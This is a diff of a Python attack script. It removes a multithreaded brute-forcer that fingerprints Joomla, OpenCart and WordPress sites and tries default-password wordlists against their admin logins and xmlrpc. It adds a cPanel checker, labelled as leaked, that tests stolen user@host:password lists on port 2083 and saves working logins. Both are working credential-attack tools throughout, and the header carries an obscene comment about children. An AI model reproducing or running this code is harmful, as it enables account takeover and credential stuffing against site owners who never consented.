@@ -1,218 +1,139 @@
-# -*- coding: utf-8 -*
-# !/usr/bin/python
-# Coded by Raiz0WorM #
-# FUCK A KID !
-##############[LIBS]###################
-import requests, re, os, sys, codecs, random
-from multiprocessing.dummy import Pool
-from time import time as timer
-import time
-from urlparse import urlparse
-import warnings
-from requests.packages.urllib3.exceptions import InsecureRequestWarning
+from termcolor import colored
+import requests
+import os
+import random
+import colorama
+import ctypes
 from colorama import Fore
-from platform import system
-from colorama import Style
-from colorama import init
-warnings.simplefilter('ignore', InsecureRequestWarning)
-reload(sys)
-sys.setdefaultencoding('utf8')
-##########################################################################################
-init(autoreset=True)
-fr  =   Fore.RED
-fh  =   Fore.RED
-fc  =   Fore.CYAN
-fo  =   Fore.MAGENTA
-fw  =   Fore.WHITE
-fy  =   Fore.YELLOW
-fbl =   Fore.BLUE
-fg  =   Fore.GREEN
-sd  =   Style.DIM
-fb  =   Fore.RESET
-sn  =   Style.NORMAL
-sb  =   Style.BRIGHT
+from concurrent.futures import ThreadPoolExecutor
 
-#####################################
-##########################################################################################
-try:
-    with codecs.open(sys.argv[1], mode='r', encoding='ascii', errors='ignore') as f:
-        ooo = f.read().splitlines()
-except IndexError:
-    print (ktnred + '[+]================> ' + 'USAGE: ' + sys.argv[0] + ' listsite.txt' + CEND)
-    pass
-ooo = list((ooo))
+bannar_color = [
+    colored('magenta', attrs=['bold']),
+    colored('orchid', attrs=['bold']),
+    colored('cyan', attrs=['bold']),
+    colored('yellow', attrs=['bold']),
+    colored('red', attrs=['bold']),
+    colored('white', attrs=['bold']),
+    colored('green', attrs=['bold']),
+    colored('#aa557f', attrs=['bold']),
+    colored('#33ff29', attrs=['bold']),
+    colored('plum_3', attrs=['bold']),
+    colored('#ff1d00', attrs=['bold']),
+    colored('#ab01ff', attrs=['bold']),
+    colored('#c81d59', attrs=['bold']),
+    colored('blue', attrs=['bold']),
+    colored('#c81d59', 'cyan', attrs=['bold']),
+]
+
+# Rest of your code using the 'bannar_color' list
 
 
-##########################################################################################
-def urlfix(url):
-    if url[-1] == "/":
-        pattern = re.compile('(.*)/')
-        site = re.findall(pattern, url)
-        url = site[0]
-    if url[:7] != "http://" and url[:8] != "https://":
-        url = "http://" + url
-    return url
 
 
-##########################################################################################
+W = bannar_color[3] #yellow
+Y = bannar_color[0] #magenta
+B = bannar_color[2] #cyan
+G = bannar_color[6] #green
+R = bannar_color[4] #red
+M = bannar_color[7] ##aa557f
+X = bannar_color[8] ##33ff29
+Z = bannar_color[9] ##ff1d00
+Q = bannar_color[10]##ab01ff
+GG = bannar_color[11]##c81d59
+WI = bannar_color[5]#white
+BOOLD = bannar_color[12]
+bl = bannar_color[-2]
+F = bannar_color[-1]
 
-def x1(url):
+if not os.path.exists('Result'):
+    os.mkdir('Result')
+
+colorama.init()
+
+head = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36'}
+TOTAL = 0
+WORK = 0
+WRONG = 0
+BAD = 0
+
+
+def checker(line):
+    global TOTAL
+    global WORK
+    global WRONG
+    global BAD
+       
+    spl = line.split('@')
+    user = spl[0]
+    url = spl[1].split(':')[0]
+    miniurl = url+':2083'
+    url = 'https://'+url + ':2083/login/?login_only=1'
+    passw = line.split(':')[1]
+
+
+    
+    data = f'user={user}&pass={passw}&goto_uri=%2F'
     try:
-        Agent = {'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:28.0) Gecko/20100101 Firefox/28.0'}
-        passwords = ['demo','demo123','admin123','123456','123456789','123','1234','12345','password123','1234567','12345678','123456789','admin1234','pass1234','admin123456','pass123','root','321321','123123','112233','102030','password','pass','qwerty','abc123','654321']
-        admins = ['admin', 'administrator', 'demo']
-        ss = requests.session()
-        for passwd in passwords:
-            for admin in admins:
-                passwd = passwd.strip()
-                admin = admin.strip()
-                target = ss.get(url + '/administrator/index.php', headers=Agent, verify=False, allow_redirects=False, timeout=6)
-                pattern = re.compile('type="hidden" name="(.*?)" value="1"')
-                findtoken = re.findall(pattern, target.content)
-                data = {'username': admin,
-                        'passwd': passwd,
-                        findtoken[0]: '1',
-                        'lang': 'en-GB',
-                        'option': 'com_login',
-                        'task': 'login',
-                        'return': 'aW5kZXgucGhw'}
-                post_data = ss.post(url + '/administrator/index.php', data=data, headers=Agent, verify=False, timeout=6)
-                if 'New Article' in post_data.content:
-                    print '{}{} [JOOMLA-BRUTEFORCE]'.format(fc, sb) + url + '{}{} ~[GOOD LOGIN. #!!!###]'.format(fg, sb)
-                    open('Joomla_Bruteforced.txt', 'a').write(url + '/administrator/index.php&' + admin + '&~' + passwd + '#' + '\n')
-                    sys.exit()
-                else:
-                    print '{}{} [JOOMLA-BRUTEFORCE]'.format(fc, sb) + url + '{}{} ~[Bad Credentials #~&&!!]'.format(fr, sb)
-                pass
-            pass
-        pass
+        r = requests.post(url,headers=head,data=data,allow_redirects=False).text
+
+        result = f'URL: {miniurl}\nUSER: {user}\nPASS: {passw}\n[>] Cracked & Checked\n\n'
+
+        if '{"notices":[]' in r or 'security_token":"' in r:
+            print(f'{Fore.LIGHTCYAN_EX}[{Fore.LIGHTMAGENTA_EX}>{Fore.LIGHTCYAN_EX}]{Fore.LIGHTGREEN_EX}[FOUND]{Fore.LIGHTWHITE_EX} {miniurl}|{user}|{passw} {Fore.LIGHTBLUE_EX}MSG: {Fore.LIGHTYELLOW_EX} VALID CPANEL ')
+            WORK +=1
+            TOTAL +=1
+
+            save = open('Result/Work Cpanels.txt','a')
+            save.write(result)
+            save.close()
+        if 'invalid_login' in r:
+            print(f"{Fore.LIGHTCYAN_EX}[{Fore.LIGHTMAGENTA_EX}>{Fore.LIGHTCYAN_EX}]{Fore.LIGHTGREEN_EX}[FOUND]{Fore.LIGHTWHITE_EX} {miniurl}|{user}|{passw} {Fore.LIGHTBLUE_EX}MSG: {Fore.LIGHTYELLOW_EX}FOUND CPANEL BUT WRONG PASSWORD")
+            WRONG +=1
+            TOTAL +=1
+            save = open('Result/Cpanels WrongPassword.txt','a')
+            save.write(result)
+            save.close()
     except:
-        pass
-    pass
-
-def x2(url):
-    try:
-        site = url + '/admin/index.php'
-        headers = {'User-Agent': 'Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:28.0) Gecko/20100101 Firefox/28.0'}
-        passwords = ['demo','demo123','admin123','123456','123456789','123','1234','12345','password123','1234567','12345678','123456789','admin1234','pass1234','admin123456','pass123','root','321321','123123','112233','102030','password','pass','qwerty','abc123','654321']
-        for i in passwords:
-            data = {'username': 'admin', 'password': i}
-            khabib = requests.post(site, headers=headers, data=data, verify=False, timeout=6)
-            if 'common/logout' in khabib.text:
-                print '{}{} [OpenCart-BRUTEFORCE] : '.format(fo, sb) + site + '\n' + '{}{} [CRACKED-SUCCESSFULLY] : '.format(fg, sb)
-                open('Opencart_Bruteforced.txt', 'a').write(site + '|admin|' + '|' + i + '|' + '\n')
-            else:
-                print '{}{} [OpenCart-BRUTEFORCE] : '.format(fo, sb) + site + '\n' + '{}{} [BAD PASSWORD] : '.format(fr, sb)
-
-    except:
-        pass
-    pass
-
-def x3(url):
-    try:
-        ua = {
-            'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.63 Safari/537.31'}
-        ngambil = requests.get(url + '/wp-json/wp/v2/users', headers=ua, verify=False, timeout=10)
-        hasil = re.findall('"slug":"(.*?)"', ngambil.text)
-        login = hasil[0]
-        pas = ['Password', '!@#$%^&*', '12345678', '12345', 'abc123', 'passw0rd', 'iloveyou', 'letmein', 'starwars',
-               'whatever', '123456', 'qwerty123', 'admin123', 'admin1234', 'admin12345', 'admin123456', 'admin1234567',
-               'Admin123', 'Admin1234', 'Admin12345', 'Admin123456', 'Admin1234567', 'qwerty', 'admin', 'Admin',
-               'fuckyou', 'admin@123', 'password123', login, login + '!', login + '@12', login + '@1', login + '@123',
-               login + '1', login + '2', login + '3', login + '4', login + '5', login + '6', login + '7', login + '8',
-               login + '9', login + '0', login + '10', login + '12', login + '123', login + '1234', login + '12345',
-               login + '123456', login + '1234567', login + '12345678', login + '123##@@', login + '123@@##',
-               login + '123#@', login + '123@#', login + '12##@@', login + '12@@##', login + '1##@@', login + '1@@##',
-               login + '!@#!@#', login + '#@!#@!', login + '!@#', login + '#@!', login + '098', login + '0987',
-               login + '09876', login + '098765', login + '0987654', login + '09876543', login + '098765432',
-               login + '0987654321', login + '11', login + '10', login + '09', login + '08', login + '07', login + '06',
-               login + '05', login + '04', login + '03', login + '02', login + '01', login + '00', login + '153214',
-               login + '2017', login + '2016', login + '2015', login + '2014', login + '2018', login + '2019',
-               login + '2010', login + '2011', login + '2012', login + '2013', login + '2001', login + '2002',
-               login + '2003', login + '2004', login + '2005', login + '2006', login + '2007', login + '2008',
-               login + '2009', login + '654321', 'pass', login + 'pass', '654321', '123123', login + '123123', 'admins',
-               'password', 'pass123', 'pass1234', 'pass12345', 'pass123456', 'administrator', '000000']
-        for passwd in pas:
-            fock = requests.post(url + '/xmlrpc.php', timeout=10, headers=ua,
-                                 data="<methodCall><methodName>wp.getUsersBlogs</methodName><params><param><value>" + login + "</value></param><param><value>" + passwd + "</value></param></params></methodCall>")
-            if 'blogName' in fock.content:
-                print '{}{} [WordPress-BRUTEFORCE] : '.format(fy, sb) + url + '\n' + '{}{} [CRACKED-SUCCESSFULLY] : '.format(fg, sb)
-                with open('WordPress_Bruteforced.txt', 'a') as o:
-                    o.writelines(url + '/wp-login.php' + '#' + login + '@' + passwd + '\n')
-                break
-            else:
-                print '{}{} [WordPress-BRUTEFORCE] : '.format(fo, sb) + url + '\n' + '{}{} ~[Bad Credentials #~&&!!] : '.format(fo, sb)
-            pass
-        pass
-    except:
-        pass
-    pass
+        print(f'{Fore.LIGHTCYAN_EX}[{Fore.LIGHTMAGENTA_EX}<{Fore.LIGHTCYAN_EX}]{Fore.LIGHTRED_EX}[BAD]{Fore.LIGHTWHITE_EX} {miniurl}')
+        BAD +=1
+        TOTAL +=1
+    ctypes.windll.kernel32.SetConsoleTitleW(f'Cpanel Cracker Leaked By : @xploitpriv | Checked {TOTAL}\\{num} \\ WORK {WORK} \\ WrongPASS {WRONG} \\ BAD {BAD}')
 
 
-##########################################################################################
-def check(url):
-    try:
-        url = urlfix(url)
-        Agent = {
-            'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36'}
-        se = requests.session()
-        ktn1 = se.get(url+'/administrator/', headers=Agent, verify=False, timeout=30)
-        ktn2 = se.get(url+'/admin/index.php', headers=Agent, verify=False, timeout=30)
-        ktn3 = se.get(url+'/wp-login.php', headers=Agent, verify=False, timeout=30)
-        if 'Joomla' in ktn1.text:
-            x1(url)
-            open('Joomla.txt', 'a').write(url + '\n')
-            pass
-        elif 'common/login' in ktn2.content:
-            x2(url)
-            open('Opencart.txt', 'a').write(url + '\n')
-            pass
-        elif 'WordPress' in ktn3.content:
-            x3(url)
-            open('WordPress.txt', 'a').write(url + '\n')
-            pass
-        else:
-            pass
-        pass
-    except:
-        pass
-    pass
-
-
-##########################################################################################
-def logo():
-    clear = "\x1b[0m"
-    colors = [36, 32, 34, 35, 31, 37]
-    x = '''
-	     _____       _      _____          __        __  __ _    _        _____ _    ______
- |  __ \     (_)    / _ \ \        / /       |  \/  | |  | |      / ____| |  |  ____|
- | |__) |__ _ _ ___| | | \ \  /\  / /__  _ __| \  / | |__| | __ _| |    | | _| |__   _ __
- |  _  // _` | |_  / | | |\ \/  \/ / _ \| '__| |\/| |  __  |/ _` | |    | |/ /  __| | '__|
- | | \ \ (_| | |/ /| |_| | \  /\  / (_) | |  | |  | | |  | | (_| | |____|   <| |____| |
- |_|  \_\__,_|_/___|\___/   \/  \/ \___/|_|  |_|  |_|_|  |_|\__,_|\_____|_|\_\______|_|
- 
-
+def main():
+    global num
+    if os.name == 'nt':
+        os.system('cls')
+    else:os.system('clear')
+    os.system('mode con:cols=130 lines=30')
+    ctypes.windll.kernel32.SetConsoleTitleW('Cpanel Cracker Leaked By : @xploitpriv')
+    x = f'''                                                                                                                                                                                                                        
+{Fore.LIGHTBLUE_EX}   ____                                        ___          ____                            ___                      
+{Fore.LIGHTCYAN_EX}  6MMMMb/                                      `MM         6MMMMb/                          `MM                      
+{Fore.LIGHTGREEN_EX} 8P    YM                                       MM        8P    YM                           MM                      
+{Fore.LIGHTMAGENTA_EX}6M      Y __ ____      ___   ___  __     ____   MM       6M      Y ___  __    ___     ____   MM   __   ____  ___  __ 
+{Fore.LIGHTCYAN_EX}MM        `M6MMMMb   6MMMMb  `MM 6MMb   6MMMMb  MM       MM        `MM 6MM  6MMMMb   6MMMMb. MM   d'  6MMMMb `MM 6MM 
+{Fore.LIGHTRED_EX}MM         MM'  `Mb 8M'  `Mb  MMM9 `Mb 6M'  `Mb MM       MM         MM69 " 8M'  `Mb 6M'   Mb MM  d'  6M'  `Mb MM69 " 
+{Fore.LIGHTYELLOW_EX}MM         MM    MM     ,oMM  MM'   MM MM    MM MM       MM         MM'        ,oMM MM    `' MM d'   MM    MM MM'    
+{Fore.LIGHTGREEN_EX}MM         MM    MM ,6MM9'MM  MM    MM MMMMMMMM MM       MM         MM     ,6MM9'MM MM       MMdM.   MMMMMMMM MM     
+{Fore.LIGHTMAGENTA_EX}YM      6  MM    MM MM'   MM  MM    MM MM       MM       YM      6  MM     MM'   MM MM       MMPYM.  MM       MM     
+{Fore.LIGHTCYAN_EX} 8b    d9  MM.  ,M9 MM.  ,MM  MM    MM YM    d9 MM        8b    d9  MM     MM.  ,MM YM.   d9 MM  YM. YM    d9 MM     
+{Fore.LIGHTYELLOW_EX}  YMMMM9   MMYMMM9  `YMMM9'Yb_MM_  _MM_ YMMMM9 _MM_        YMMMM9  _MM_    `YMMM9'Yb.YMMMM9 _MM_  YM._YMMMM9 _MM_    
+{Fore.LIGHTBLUE_EX}           MM                                                                                                        
+{Fore.LIGHTCYAN_EX}           MM                                                                                                        
+{Fore.LIGHTYELLOW_EX}          _MM_                                           
+                                                
+                                
 '''
-    for N, line in enumerate(x.split("\n")):
-        sys.stdout.write("\x1b[1;%dm%s%s\n" % (random.choice(colors), line, clear))
-        time.sleep(0.05)
-        pass
 
-
-logo()
-
-
-##########################################################################################
-def Main():
-    try:
-
-        start = timer()
-        ThreadPool = Pool(200)
-        Threads = ThreadPool.map(check, ooo)
-        print('TIME TAKE: ' + str(timer() - start) + ' S')
-    except:
-        pass
-
-
-if __name__ == '__main__':
-    Main()
+    print(x)
+    lista = input('List! ')
+    if os.name == 'nt':
+        os.system('cls')
+    else:os.system('clear')
+    with open(lista,'r') as f:
+        lines = f.read().splitlines()
+        num = len(lines)
+    with ThreadPoolExecutor(max_workers=100) as p:
+        p.map(checker,lines)
+main()
